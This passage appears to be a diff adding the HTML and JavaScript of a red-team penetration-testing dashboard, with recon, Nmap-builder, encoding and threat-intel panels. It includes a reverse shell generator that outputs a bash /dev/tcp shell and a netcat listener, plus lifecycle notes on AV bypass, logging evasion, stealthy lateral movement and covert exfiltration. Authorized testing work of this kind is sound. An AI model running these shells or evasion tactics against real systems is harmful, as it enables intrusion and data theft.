+    <div class="nav-item" onclick="scrollTo_('#encoding-section')"><span class="icon">⇌</span> Encode/Decode</div>
+    <div class="nav-item" onclick="scrollTo_('#hash-section')"><span class="icon">#</span> Hash Identifier</div>
+    <div class="nav-item" onclick="scrollTo_('#notes-section')"><span class="icon">✎</span> Op Notes</div>
+  </div>
+</nav>
+
+<!-- Header -->
+<header id="header">
+  <button id="hamburger" onclick="toggleSidebar()">☰</button>
+  <div id="header-title"><span class="status-dot"></span> &nbsp;REDTEAM OPERATOR DASHBOARD</div>
+  <div class="header-actions">
+    <input type="text" id="global-search" placeholder="Search commands..." oninput="handleSearch(this.value)">
+    <button class="btn-header" onclick="openTerminal()">▶ Terminal</button>
+    <button class="btn-header" onclick="exportReport()">⬇ Export Report</button>
+    <div style="display:flex;gap:6px;align-items:center;">
+      <div class="theme-btn active" style="background:linear-gradient(135deg,#00ff9f,#00d4ff)" onclick="setTheme('', this)" title="Matrix Green"></div>
+      <div class="theme-btn" style="background:linear-gradient(135deg,#ff00aa,#aa00ff)" onclick="setTheme('cyberpunk', this)" title="Cyberpunk"></div>
+      <div class="theme-btn" style="background:linear-gradient(135deg,#00aaff,#0066ff)" onclick="setTheme('stealth', this)" title="Stealth Blue"></div>
+    </div>
+  </div>
+</header>
+
+<!-- Main -->
+<main id="main">
+<div id="content">
+
+<!-- TARGET ANALYSIS -->
+<div class="section" id="target-section">
+  <div class="section-title">◈ Target Analysis Panel</div>
+  <div class="panel" id="scan-panel">
+    <div class="scan-input-row">
+      <input type="text" class="scan-input" id="target-input" placeholder="Enter company domain or IP (example.com or 192.168.1.1)" value="">
+      <div class="spinner" id="scan-spinner"></div>
+      <button class="btn-scan" onclick="runAnalysis()">▶ Start Analysis</button>
+    </div>
+    <div id="analysis-status" class="mt-2 text-xs text-cyan-200" aria-live="polite"></div>
+
+    <div class="tabs" id="analysis-tabs">
+      <div class="tab active" onclick="switchTab('domain')">Domain Info</div>
+      <div class="tab" onclick="switchTab('ssl')">SSL/TLS</div>
+      <div class="tab" onclick="switchTab('ports')">Open Ports</div>
+      <div class="tab" onclick="switchTab('whois')">WHOIS</div>
+      <div class="tab" onclick="switchTab('headers')">Sec Headers</div>
+      <div class="tab" onclick="switchTab('http')">HTTP Info</div>
+      <div class="tab" onclick="switchTab('tech')">Tech Stack</div>
+    </div>
+
+    <!-- Domain Info -->
+    <div class="tab-content active" id="tab-domain">
+      <div class="info-grid" id="domain-results">
+        <div class="info-card"><div class="info-label">Status</div><div class="info-value">Enter a target above to begin analysis</div></div>
+      </div>
+    </div>
+
+    <!-- SSL -->
+    <div class="tab-content" id="tab-ssl">
+      <div class="info-grid" id="ssl-results">
+        <div class="info-card"><div class="info-label">Status</div><div class="info-value">Awaiting target input...</div></div>
+      </div>
+    </div>
+
+    <!-- Ports -->
+    <div class="tab-content" id="tab-ports">
+      <div style="display:flex;gap:12px;margin-bottom:14px;flex-wrap:wrap;">
+        <input type="text" class="scan-input" style="min-width:160px;flex:0 1 200px" id="port-range" placeholder="Port range (1-1000)" value="1-1000">
+        <select class="builder-select" id="port-scan-type" style="flex:0 1 160px">
+          <option>TCP Connect</option>
+          <option>SYN Scan</option>
+          <option>UDP Scan</option>
+          <option>Service Detect</option>
+        </select>
+        <button class="btn-scan" onclick="runPortScan()">Scan Ports</button>
+      </div>
+      <div id="port-results">
+        <table class="port-table">
+          <thead><tr><th>Port</th><th>Service</th><th>Status</th><th>Version</th></tr></thead>
+          <tbody id="port-tbody"><tr><td colspan="4" style="color:var(--text-dim);text-align:center;padding:20px">Enter a target and click Scan Ports</td></tr></tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- WHOIS -->
+    <div class="tab-content" id="tab-whois">
+      <div class="info-grid" id="whois-results">
+        <div class="info-card"><div class="info-label">Status</div><div class="info-value">Awaiting target input...</div></div>
+      </div>
+    </div>
+
+    <!-- Security Headers -->
+    <div class="tab-content" id="tab-headers">
+      <div id="headers-results">
+        <div style="color:var(--text-dim);padding:20px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:12px">Enter a target and run analysis to check security headers</div>
+      </div>
+    </div>
+
+    <!-- HTTP -->
+    <div class="tab-content" id="tab-http">
+      <div class="info-grid" id="http-results">
+        <div class="info-card"><div class="info-label">Status</div><div class="info-value">Awaiting target input...</div></div>
+      </div>
+    </div>
+
+    <!-- Tech Stack -->
+    <div class="tab-content" id="tab-tech">
+      <div class="info-grid" id="tech-results">
+        <div class="info-card"><div class="info-label">Status</div><div class="info-value">Awaiting target input...</div></div>
+      </div>
+    </div>
+
+  </div><!-- end panel -->
+</div>
+
+<!-- RED TEAM LIFECYCLE -->
+<div class="section" id="lifecycle-section">
+  <div class="section-title">◎ Red Team Lifecycle</div>
+  <div class="panel" id="lifecycle-panel">
+    <!-- Phases will be injected by JS -->
+  </div>
+</div>
+
+<!-- NMAP LIBRARY -->
+<div class="section" id="nmap-section">
+  <div class="section-title">⎈ Nmap Command Library</div>
+  <div id="nmap-blocks">
+    <!-- Injected by JS -->
+  </div>
+</div>
+
+<!-- ENUMERATION -->
+<div class="section" id="enum-section">
+  <div class="section-title">⊞ Enumeration Script Library</div>
+  <div id="enum-blocks">
+    <!-- Injected by JS -->
+  </div>
+</div>
+
+<!-- COMMAND BUILDER -->
+<div class="section" id="builder-section">
+  <div class="section-title">⚙ Smart Nmap Command Builder</div>
+  <div class="panel" style="padding:20px">
+    <div class="builder-grid">
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Target</div>
+        <input type="text" class="builder-input" id="b-target" placeholder="target.com or 192.168.1.1" oninput="buildCommand()">
+      </div>
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Scan Type</div>
+        <select class="builder-select" id="b-type" onchange="buildCommand()">
+          <option value="-sS">SYN Scan (-sS)</option>
+          <option value="-sT">TCP Connect (-sT)</option>
+          <option value="-sU">UDP Scan (-sU)</option>
+          <option value="-sN">NULL Scan (-sN)</option>
+          <option value="-sF">FIN Scan (-sF)</option>
+          <option value="-sX">XMAS Scan (-sX)</option>
+        </select>
+      </div>
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Port Range</div>
+        <input type="text" class="builder-input" id="b-ports" placeholder="e.g. 22,80,443 or 1-65535" oninput="buildCommand()">
+      </div>
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Script / Detection</div>
+        <select class="builder-select" id="b-script" onchange="buildCommand()">
+          <option value="">None</option>
+          <option value="-sV">Service Version (-sV)</option>
+          <option value="-O">OS Detection (-O)</option>
+          <option value="-A">Aggressive (-A)</option>
+          <option value="--script vuln">Vuln Scripts</option>
+          <option value="--script http-enum">HTTP Enum</option>
+          <option value="--script smb-enum-shares">SMB Enum</option>
+          <option value="--script ssl-enum-ciphers">SSL Ciphers</option>
+        </select>
+      </div>
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Timing</div>
+        <select class="builder-select" id="b-timing" onchange="buildCommand()">
+          <option value="">Default</option>
+          <option value="-T0">T0 – Paranoid</option>
+          <option value="-T1">T1 – Sneaky</option>
+          <option value="-T2">T2 – Polite</option>
+          <option value="-T3">T3 – Normal</option>
+          <option value="-T4">T4 – Aggressive</option>
+          <option value="-T5">T5 – Insane</option>
+        </select>
+      </div>
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Output</div>
+        <select class="builder-select" id="b-output" onchange="buildCommand()">
+          <option value="">No output file</option>
+          <option value="-oN output.txt">Normal (-oN)</option>
+          <option value="-oX output.xml">XML (-oX)</option>
+          <option value="-oG output.gnmap">Grepable (-oG)</option>
+          <option value="-oA output">All formats (-oA)</option>
+        </select>
+      </div>
+    </div>
+    <div class="info-label" style="margin-bottom:8px">Generated Command</div>
+    <div class="built-command" id="built-command">nmap <span style="color:var(--text-dim)"># configure options above</span></div>
+    <div style="display:flex;gap:10px;margin-top:12px">
+      <button class="btn-copy" onclick="copyBuiltCommand()">Copy Command</button>
+    </div>
+  </div>
+</div>
+
+<!-- CHECKLIST -->
+<div class="section" id="checklist-section">
+  <div class="section-title">☑ Red Team Checklist</div>
+  <div class="panel" style="padding:20px">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+      <div style="font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--text-dim)">Progress: <span id="checklist-pct" style="color:var(--neon)">0%</span></div>
+      <button class="btn-copy" onclick="resetChecklist()">Reset</button>
+    </div>
+    <div class="progress-bar-wrap"><div class="progress-bar" id="checklist-bar" style="width:0%"></div></div>
+    <div id="checklist-items"><!-- Injected by JS --></div>
+  </div>
+</div>
+
+<!-- SUBDOMAIN DISCOVERY -->
+<div class="section" id="subdomain-section">
+  <div class="section-title">⊕ Subdomain Discovery</div>
+  <div class="panel" style="padding:20px">
+    <div class="scan-input-row">
+      <input type="text" class="scan-input" id="subdomain-input" placeholder="Enter domain (e.g. example.com)">
+      <div class="spinner" id="subdomain-spinner"></div>
+      <button class="btn-scan" onclick="runSubdomainScan()">▶ Find Subdomains</button>
+    </div>
+    <div id="subdomain-status" style="font-size:12px;color:var(--text-dim);font-family:'Share Tech Mono',monospace;margin-bottom:12px"></div>
+    <div id="subdomain-results">
+      <table class="subdomain-table">
+        <thead><tr><th>Subdomain</th><th>Issuer</th><th>Not Before</th></tr></thead>
+        <tbody id="subdomain-tbody"><tr><td colspan="3" style="color:var(--text-dim);text-align:center;padding:20px">Enter a domain and click Find Subdomains</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- REVERSE SHELL GENERATOR -->
+<div class="section" id="revshell-section">
+  <div class="section-title">⌘ Reverse Shell Generator</div>
+  <div class="panel" style="padding:20px">
+    <div class="builder-grid">
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Language</div>
+        <select class="builder-select" id="revshell-lang" onchange="generateRevShell()">
+          <option value="bash">Bash -i</option>
+          <option value="bash2">Bash TCP</option>
+          <option value="python">Python</option>
+          <option value="python3">Python3</option>
+          <option value="php">PHP</option>
+          <option value="perl">Perl</option>
+          <option value="ruby">Ruby</option>
+          <option value="nc">Netcat (-e)</option>
+          <option value="ncmkfifo">Netcat (mkfifo)</option>
+          <option value="powershell">PowerShell</option>
+          <option value="java">Java</option>
+          <option value="xterm">xterm</option>
+          <option value="socat">Socat</option>
+          <option value="lua">Lua</option>
+        </select>
+      </div>
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Listener IP</div>
+        <input type="text" class="builder-input" id="revshell-ip" placeholder="10.10.14.1" oninput="generateRevShell()" value="10.10.14.1">
+      </div>
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Listener Port</div>
+        <input type="text" class="builder-input" id="revshell-port" placeholder="4444" oninput="generateRevShell()" value="4444">
+      </div>
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Listener Command</div>
+        <div class="revshell-output" id="revshell-listener" style="font-size:12px;min-height:auto;padding:10px 14px">nc -lvnp 4444</div>
+      </div>
+    </div>
+    <div class="info-label" style="margin-bottom:8px">Generated Reverse Shell</div>
+    <div class="revshell-output" id="revshell-output">bash -i >& /dev/tcp/10.10.14.1/4444 0>&1</div>
+    <div style="display:flex;gap:10px;margin-top:12px">
+      <button class="btn-copy" onclick="copyRevShell(this)">Copy Shell</button>
+      <button class="btn-copy" onclick="copyListener(this)">Copy Listener</button>
+    </div>
+  </div>
+</div>
+
+<!-- ENCODING/DECODING -->
+<div class="section" id="encoding-section">
+  <div class="section-title">⇌ Encoding / Decoding Tools</div>
+  <div class="panel" style="padding:20px">
+    <div class="tool-btn-row" id="encoding-type-btns">
+      <button class="btn-tool active" onclick="setEncodingType('base64',this)">Base64</button>
+      <button class="btn-tool" onclick="setEncodingType('url',this)">URL</button>
+      <button class="btn-tool" onclick="setEncodingType('html',this)">HTML</button>
+      <button class="btn-tool" onclick="setEncodingType('hex',this)">Hex</button>
+      <button class="btn-tool" onclick="setEncodingType('rot13',this)">ROT13</button>
+    </div>
+    <div class="tool-grid">
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Input</div>
+        <textarea class="tool-textarea" id="enc-input" placeholder="Enter text to encode/decode..." rows="6"></textarea>
+        <div class="tool-btn-row">
+          <button class="btn-scan" style="padding:8px 20px;font-size:10px" onclick="doEncode()">▶ Encode</button>
+          <button class="btn-scan" style="padding:8px 20px;font-size:10px;background:linear-gradient(135deg, var(--neon2), var(--neon3))" onclick="doDecode()">◀ Decode</button>
+        </div>
+      </div>
+      <div>
+        <div class="info-label" style="margin-bottom:6px">Output</div>
+        <textarea class="tool-textarea" id="enc-output" placeholder="Result will appear here..." rows="6" readonly></textarea>
+        <div class="tool-btn-row">
+          <button class="btn-copy" onclick="copyEncOutput(this)">Copy Output</button>
+          <button class="btn-copy" onclick="swapEncFields()">↕ Swap</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- HASH IDENTIFIER -->
+<div class="section" id="hash-section">
+  <div class="section-title"># Hash Identifier</div>
+  <div class="panel" style="padding:20px">
+    <div class="scan-input-row">
+      <input type="text" class="scan-input" id="hash-input" placeholder="Paste a hash string to identify...">
+      <button class="btn-scan" onclick="identifyHash()">▶ Identify</button>
+    </div>
+    <div id="hash-results">
+      <div style="color:var(--text-dim);padding:12px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:12px">Enter a hash above to identify its type</div>
+    </div>
+  </div>
+</div>
+
+<!-- OPERATION NOTES -->
+<div class="section" id="notes-section">
+  <div class="section-title">✎ Operation Notes</div>
+  <div class="panel" style="padding:20px">
+    <div class="notes-meta" id="notes-meta">No saved notes</div>
+    <textarea class="tool-textarea" id="notes-textarea" placeholder="Record your operation notes, findings, credentials, etc..." rows="10"></textarea>
+    <div style="display:flex;gap:10px;margin-top:12px;flex-wrap:wrap">
+      <button class="btn-scan" style="padding:8px 20px;font-size:10px" onclick="saveNotes()">💾 Save Notes</button>
+      <button class="btn-copy" onclick="exportNotes()">⬇ Export Notes</button>
+      <button class="btn-copy" onclick="clearNotes()">✕ Clear Notes</button>
+    </div>
+  </div>
+</div>
+
+<!-- API KEY SETTINGS -->
+<div class="section" id="api-settings-section">
+  <div class="section-title">⚷ API Key Configuration</div>
+  <div class="panel" style="padding:24px">
+    <div style="font-size:12px;color:var(--text-dim);font-family:'Share Tech Mono',monospace;margin-bottom:16px;line-height:1.6">
+      Configure your API keys below. Keys are stored securely in your browser's localStorage and never transmitted to third parties.
+      You can also provide keys via the <code style="color:var(--neon);background:rgba(0,255,159,0.08);padding:2px 6px;border-radius:3px">api-keys.json</code> file.
+    </div>
+    <div class="api-service-grid">
+      <div class="api-service-card">
+        <div class="service-header">
+          <div class="service-icon">⌬</div>
+          <div>
+            <div class="service-name">Shodan</div>
+            <div style="font-size:10px;color:var(--text-dim)">developer.shodan.io</div>
+          </div>
+        </div>
+        <div class="service-desc">Internet-connected device search engine. Provides host info, open ports, vulnerabilities, and banners.</div>
+        <input type="password" class="api-key-input" id="api-key-shodan" placeholder="Enter Shodan API key..." oninput="saveApiKey('shodan', this.value)">
+        <div id="api-status-shodan" class="api-status not-configured">● Not configured</div>
+      </div>
+      <div class="api-service-card">
+        <div class="service-header">
+          <div class="service-icon">◐</div>
+          <div>
+            <div class="service-name">GreyNoise</div>
+            <div style="font-size:10px;color:var(--text-dim)">viz.greynoise.io</div>
+          </div>
+        </div>
+        <div class="service-desc">Identifies internet scanners and noise. Tells you if an IP is mass-scanning the internet or is targeted.</div>
+        <input type="password" class="api-key-input" id="api-key-greynoise" placeholder="Enter GreyNoise API key..." oninput="saveApiKey('greynoise', this.value)">
+        <div id="api-status-greynoise" class="api-status not-configured">● Not configured</div>
+      </div>
+      <div class="api-service-card">
+        <div class="service-header">
+          <div class="service-icon">⚠</div>
+          <div>
+            <div class="service-name">VulDB</div>
+            <div style="font-size:10px;color:var(--text-dim)">vuldb.com</div>
+          </div>
+        </div>
+        <div class="service-desc">Vulnerability intelligence database. Search CVEs, exploits, and threat intelligence data.</div>
+        <input type="password" class="api-key-input" id="api-key-vuldb" placeholder="Enter VulDB API key..." oninput="saveApiKey('vuldb', this.value)">
+        <div id="api-status-vuldb" class="api-status not-configured">● Not configured</div>
+      </div>
+      <div class="api-service-card">
+        <div class="service-header">
+          <div class="service-icon">◈</div>
+          <div>
+            <div class="service-name">FullHunt</div>
+            <div style="font-size:10px;color:var(--text-dim)">fullhunt.io</div>
+          </div>
+        </div>
+        <div class="service-desc">Attack surface management platform. Discover exposed assets, subdomains, and services for a domain.</div>
+        <input type="password" class="api-key-input" id="api-key-fullhunt" placeholder="Enter FullHunt API key..." oninput="saveApiKey('fullhunt', this.value)">
+        <div id="api-status-fullhunt" class="api-status not-configured">● Not configured</div>
+      </div>
+      <div class="api-service-card">
+        <div class="service-header">
+          <div class="service-icon">⚡</div>
+          <div>
+            <div class="service-name">OWASP ZAP</div>
+            <div style="font-size:10px;color:var(--text-dim)">zaproxy.org</div>
+          </div>
+        </div>
+        <div class="service-desc">Connect to a local ZAP proxy for active scanning. Requires ZAP running on your machine with API enabled.</div>
+        <input type="text" class="api-key-input" id="api-key-zap-url" placeholder="ZAP URL (default: http://localhost:8080)" oninput="saveApiKey('zap_url', this.value)" style="margin-bottom:6px">
+        <input type="password" class="api-key-input" id="api-key-zap" placeholder="Enter ZAP API key..." oninput="saveApiKey('zap', this.value)">
+        <div id="api-status-zap" class="api-status not-configured">● Not configured</div>
+      </div>
+    </div>
+    <div style="margin-top:16px;display:flex;gap:10px;flex-wrap:wrap">
+      <button class="btn-scan" style="padding:8px 20px;font-size:10px" onclick="loadApiKeysFromFile()">⬆ Load from api-keys.json</button>
+      <button class="btn-copy" onclick="clearAllApiKeys()">✕ Clear All Keys</button>
+    </div>
+  </div>
+</div>
+
+<!-- SHODAN API -->
+<div class="section" id="shodan-section">
+  <div class="section-title">⌬ Shodan Intelligence</div>
+  <div class="panel" style="padding:24px">
+    <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap;align-items:center">
+      <input type="text" class="scan-input" id="shodan-query" placeholder="Enter IP address or search query (e.g., apache country:US)" style="flex:1;min-width:200px">
+      <select class="builder-select" id="shodan-mode" style="width:160px">
+        <option value="host">Host Lookup</option>
+        <option value="search">Search Query</option>
+      </select>
+      <button class="btn-scan" onclick="runShodanQuery()">▶ Query Shodan</button>
+    </div>
+    <div id="shodan-api-status" style="font-size:11px;color:var(--text-dim);font-family:'Share Tech Mono',monospace;margin-bottom:8px"></div>
+    <div id="shodan-results">
+      <div style="color:var(--text-dim);padding:20px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:12px">
+        Enter an IP or query above. Requires a Shodan API key configured in API Settings.<br>
+        Falls back to InternetDB (free, no key required) for basic host info.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- GREYNOISE API -->
+<div class="section" id="greynoise-section">
+  <div class="section-title">◐ GreyNoise Intelligence</div>
+  <div class="panel" style="padding:24px">
+    <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap;align-items:center">
+      <input type="text" class="scan-input" id="greynoise-ip" placeholder="Enter IP address to check (e.g., 8.8.8.8)" style="flex:1;min-width:200px">
+      <button class="btn-scan" onclick="runGreyNoiseQuery()">▶ Check IP</button>
+    </div>
+    <div id="greynoise-results">
+      <div style="color:var(--text-dim);padding:20px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:12px">
+        Enter an IP address to check if it is a known scanner or benign service. Requires a GreyNoise API key.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- VULDB API -->
+<div class="section" id="vuldb-section">
+  <div class="section-title">⚠ VulDB Vulnerability Intelligence</div>
+  <div class="panel" style="padding:24px">
+    <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap;align-items:center">
+      <input type="text" class="scan-input" id="vuldb-query" placeholder="Search CVE or keyword (e.g., CVE-2021-44228 or Log4j)" style="flex:1;min-width:200px">
+      <button class="btn-scan" onclick="runVulDBQuery()">▶ Search VulDB</button>
+    </div>
+    <div id="vuldb-results">
+      <div style="color:var(--text-dim);padding:20px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:12px">
+        Search for vulnerabilities by CVE ID or keyword. Requires a VulDB API key configured in API Settings.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- FULLHUNT API -->
+<div class="section" id="fullhunt-section">
+  <div class="section-title">◈ FullHunt Attack Surface</div>
+  <div class="panel" style="padding:24px">
+    <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap;align-items:center">
+      <input type="text" class="scan-input" id="fullhunt-domain" placeholder="Enter domain (e.g., example.com)" style="flex:1;min-width:200px">
+      <select class="builder-select" id="fullhunt-mode" style="width:180px">
+        <option value="domain">Domain Details</option>
+        <option value="subdomains">Subdomains</option>
+      </select>
+      <button class="btn-scan" onclick="runFullHuntQuery()">▶ Scan Domain</button>
+    </div>
+    <div id="fullhunt-results">
+      <div style="color:var(--text-dim);padding:20px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:12px">
+        Enter a domain to discover its attack surface. Requires a FullHunt API key configured in API Settings.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ZAP SCANNER API -->
+<div class="section" id="zap-section">
+  <div class="section-title">⚡ OWASP ZAP Scanner</div>
+  <div class="panel" style="padding:24px">
+    <div style="font-size:11px;color:var(--yellow);font-family:'Share Tech Mono',monospace;margin-bottom:14px;padding:8px 12px;background:rgba(255,204,0,0.06);border:1px solid rgba(255,204,0,0.2);border-radius:4px">
+      ⚠ ZAP must be running locally with the API enabled. Ensure CORS is configured to allow requests from this dashboard.
+    </div>
+    <div class="api-section-tabs">
+      <div class="api-section-tab active" onclick="switchZapTab('status')">Status</div>
+      <div class="api-section-tab" onclick="switchZapTab('spider')">Spider</div>
+      <div class="api-section-tab" onclick="switchZapTab('scan')">Active Scan</div>
+      <div class="api-section-tab" onclick="switchZapTab('alerts')">Alerts</div>
+    </div>
+    <!-- ZAP Status -->
+    <div class="api-tab-content active" id="zap-tab-status">
+      <div style="display:flex;gap:12px;flex-wrap:wrap;align-items:center;margin-bottom:12px">
+        <button class="btn-scan" onclick="checkZapStatus()">▶ Check ZAP Status</button>
+      </div>
+      <div id="zap-status-results">
+        <div style="color:var(--text-dim);padding:16px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:12px">Click "Check ZAP Status" to verify connectivity with your local ZAP instance.</div>
+      </div>
+    </div>
+    <!-- ZAP Spider -->
+    <div class="api-tab-content" id="zap-tab-spider">
+      <div style="display:flex;gap:12px;flex-wrap:wrap;align-items:center;margin-bottom:12px">
+        <input type="text" class="scan-input" id="zap-spider-url" placeholder="Target URL (e.g., http://target.com)" style="flex:1;min-width:200px">
+        <button class="btn-scan" onclick="startZapSpider()">▶ Start Spider</button>
+        <button class="btn-copy" onclick="getZapSpiderStatus()">⟳ Check Progress</button>
+      </div>
+      <div id="zap-spider-results">
+        <div style="color:var(--text-dim);padding:16px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:12px">Enter a URL and start the spider to crawl the target application.</div>
+      </div>
+    </div>
+    <!-- ZAP Active Scan -->
+    <div class="api-tab-content" id="zap-tab-scan">
+      <div style="display:flex;gap:12px;flex-wrap:wrap;align-items:center;margin-bottom:12px">
+        <input type="text" class="scan-input" id="zap-scan-url" placeholder="Target URL (e.g., http://target.com)" style="flex:1;min-width:200px">
+        <button class="btn-scan" onclick="startZapActiveScan()">▶ Start Scan</button>
+        <button class="btn-copy" onclick="getZapScanStatus()">⟳ Check Progress</button>
+      </div>
+      <div id="zap-scan-results">
+        <div style="color:var(--text-dim);padding:16px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:12px">Enter a URL to start an active vulnerability scan. Spider the target first for best results.</div>
+      </div>
+    </div>
+    <!-- ZAP Alerts -->
+    <div class="api-tab-content" id="zap-tab-alerts">
+      <div style="display:flex;gap:12px;flex-wrap:wrap;align-items:center;margin-bottom:12px">
+        <input type="text" class="scan-input" id="zap-alerts-url" placeholder="Base URL to filter alerts (optional)" style="flex:1;min-width:200px">
+        <button class="btn-scan" onclick="getZapAlerts()">▶ Get Alerts</button>
+      </div>
+      <div id="zap-alerts-results">
+        <div style="color:var(--text-dim);padding:16px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:12px">Retrieve vulnerability alerts discovered by ZAP scans.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- DOMAIN/PORT section anchors -->
+<div id="domain-section"></div>
+<div id="ports-section"></div>
+
+</div><!-- end content -->
+
+<footer>
+  <div style="margin-bottom:6px;font-size:13px;color:var(--text)">RedTeam Operator Dashboard v2</div>
+  <span>⚠ AUTHORIZED USE ONLY</span> — This application is for authorized penetration testing and cybersecurity research only.<br>
+  Unauthorized scanning of systems without explicit permission is illegal under the Computer Fraud and Abuse Act and equivalent laws worldwide.
+</footer>
+</main>
+
+<!-- Terminal Modal -->
+<div id="terminal-modal">
+  <div class="terminal-window">
+    <div class="terminal-titlebar">
+      <span class="terminal-title">▶ OPERATOR TERMINAL</span>
+      <button class="terminal-close" onclick="closeTerminal()">✕</button>
+    </div>
+    <div class="terminal-output" id="terminal-output"></div>
+    <div class="terminal-input-row">
+      <span class="terminal-prompt">operator@redteam:~$</span>
+      <input type="text" class="terminal-input" id="terminal-input" placeholder="type 'help' for commands..." onkeydown="handleTerminalInput(event)">
+    </div>
+  </div>
+</div>
+
+<script>
+// ══════════════════════════════════════════════
+// DATA
+// ══════════════════════════════════════════════
+
+const LIFECYCLE_PHASES = [
+  {
+    num: '01', name: 'Reconnaissance', icon: '◉',
+    steps: ['Passive OSINT: LinkedIn, Shodan, Censys', 'WHOIS, DNS enumeration, subdomain discovery', 'Email harvesting (theHarvester, Hunter.io)', 'Technology fingerprinting', 'Infrastructure mapping'],
+    opsec: 'Never connect directly to target. Use VPN/Tor. Avoid Google Dorking from corporate IPs.',
+    detect: 'Keep noise low. Avoid mass DNS queries. Use passive tools where possible.',
+    logging: 'Your DNS queries may be logged. Shodan searches are anonymous. LinkedIn views are tracked.'
+  },
+  {
+    num: '02', name: 'Scanning', icon: '⌇',
+    steps: ['Nmap host discovery (-sn flag)', 'Port scanning (SYN scan preferred)', 'Service/version detection (-sV)', 'OS fingerprinting (-O)', 'Banner grabbing'],
+    opsec: 'Use decoy IPs (-D flag). Fragment packets (-f). Use slow timing (-T1 or -T2).',
+    detect: 'IDS/IPS may trigger on SYN floods. Randomize scan order (-r). Avoid default timing on sensitive targets.',
+    logging: 'Every packet sent is potentially logged by perimeter security. Assume detection on enterprise targets.'
+  },
+  {
+    num: '03', name: 'Enumeration', icon: '⊞',
+    steps: ['SMB shares and user enumeration (enum4linux)', 'SNMP community string enumeration', 'DNS zone transfer attempts', 'LDAP enumeration on AD environments', 'Web directory fuzzing (gobuster, ffuf)', 'Default credential testing'],
+    opsec: 'Enumerate from different source IPs. Use legitimate-looking User-Agents for web enum.',
+    detect: 'SMB enum may trigger AV. Multiple auth failures → account lockout. Space out requests.',
+    logging: 'All SMB auth attempts logged in Windows Event Viewer. SNMP queries logged on network devices.'
+  },
+  {
+    num: '04', name: 'Exploitation', icon: '◈',
+    steps: ['CVE-based exploitation (Metasploit, manual PoC)', 'Web app attacks (SQLi, XSS, SSRF, LFI)', 'Password attacks (Hydra, Hashcat)', 'Client-side attacks (phishing, macro payloads)', 'Service exploits'],
+    opsec: 'Use staged payloads. Encode shellcode. Bypass AV with custom implants. Avoid Metasploit defaults.',
+    detect: 'Standard Metasploit payloads are heavily signatured. Use custom stagers. Test AV bypass before engagement.',
+    logging: 'PowerShell execution logged by AMSI/ETW. Disable/bypass logging where authorized. Document scope.'
+  },
+  {
+    num: '05', name: 'Privilege Escalation', icon: '▲',
+    steps: ['Local privilege escalation (SUID, sudo misconfig, kernel exploit)', 'Token impersonation (Windows - Potato exploits)', 'DLL hijacking / weak service permissions', 'Password reuse / credential spraying', 'AS-REP Roasting, Kerberoasting on AD'],
+    opsec: 'Run linPEAS/winPEAS from memory when possible. Avoid writing tools to disk.',
+    detect: 'New processes, unexpected service installs trigger EDR. Use LOLBins (Living off the Land Binaries).',
+    logging: 'Windows: check Security Event Log 4672/4673 (special privileges). Linux: /var/log/auth.log, /var/log/secure.'
+  },
+  {
+    num: '06', name: 'Persistence', icon: '⚓',
+    steps: ['Cron jobs / Scheduled tasks', 'Registry Run keys (Windows)', 'SSH key injection', 'Web shells on servers', 'Service-based persistence', 'WMI event subscriptions'],
+    opsec: 'Use unusual filenames. Blend with system files. Avoid user home directories.',
+    detect: 'EDR monitors registry changes, new scheduled tasks, and WMI subscriptions heavily.',
+    logging: 'Windows: Sysmon captures reg modifications. Linux: auditd tracks file creation. Be aware.'
+  },
+  {
+    num: '07', name: 'Lateral Movement', icon: '→',
+    steps: ['Pass-the-Hash / Pass-the-Ticket (Mimikatz)', 'WMI / PsExec / SMB exec', 'RDP pivoting', 'SSH tunneling and port forwarding', 'Token delegation abuse'],
+    opsec: 'Reuse stolen tokens rather than new logins. Avoid creating new user accounts unless specified.',
+    detect: 'Lateral movement is high noise. Use scheduled hours (business hours blend in). Avoid 3AM activity.',
+    logging: 'Windows Event ID 4624 (logon), 4648 (explicit credential logon). Every admin connection logged.'
+  },
+  {
+    num: '08', name: 'Exfiltration', icon: '↑',
+    steps: ['Data staging and compression', 'Encrypted tunnels (C2 over HTTPS/DNS)', 'ICMP tunneling', 'Steganography for covert transfer', 'Cloud storage exfil (Dropbox, OneDrive)'],
+    opsec: 'Never exfil large amounts quickly. Stage data, compress, encrypt. Exfil over allowed protocols (HTTPS:443).',
+    detect: 'DLP solutions monitor large outbound transfers. DNS tunneling has distinct packet size patterns.',
+    logging: 'Firewall logs all outbound connections. Use authorized C2 infrastructure. Avoid personal IPs.'
+  },
+  {
+    num: '09', name: 'Cleanup', icon: '✕',
